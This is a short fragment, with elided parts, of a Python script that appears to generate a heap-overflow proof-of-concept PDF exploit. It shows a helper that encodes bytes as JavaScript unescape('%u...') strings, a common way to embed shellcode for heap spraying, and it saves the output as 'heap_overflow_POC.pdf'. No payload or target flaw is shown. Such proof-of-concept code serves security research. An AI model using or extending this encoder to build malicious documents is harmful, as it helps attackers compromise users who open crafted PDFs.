...
###       Modifications by: Shameek Hargrave (python3.12)
##########################################################################
...
def _toJS(s):
    if type(s) in set([int]) :
        s = struct.pack("<L",s) 
    assert len(s) % 2 == 0
    return "unescape('%s')"%("".join(["%u"+"".join([ "%02x%02x"%(ord(s[i*2+1]),ord(s[i*2]))]) for i in range (0,int(len(s)/2))]))
...
#renter it to stdout (modified)
# print(doc)

# save to a pdf 
filename = "heap_overflow_POC.pdf"
